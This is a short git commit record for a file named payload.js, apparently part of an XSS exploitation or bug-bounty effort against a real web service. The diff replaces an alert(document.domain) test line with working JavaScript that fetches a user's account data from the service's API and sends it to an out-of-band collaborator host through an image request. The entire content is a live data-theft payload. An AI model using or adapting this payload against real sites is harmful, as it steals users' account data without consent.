e463e78c84fc7dcb1e0919663f9bd747f11a85a9
Pedro <52047256+pedrojuniorrd@users.noreply.github.com>
2025-06-04 12:37:01 -0300

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,1 +1,6 @@
-<script>alert(document.domain)</script>
+fetch("https://playcanvas.com/api/users/shisco")
+  .then(r => r.text())
+  .then(data => {
+    const img = new Image();
+    img.src = "https://i9s0o50prcnjffe3sa6ci2h70y6pugi5.oastify.com/?" + encodeURIComponent(data);
+  });
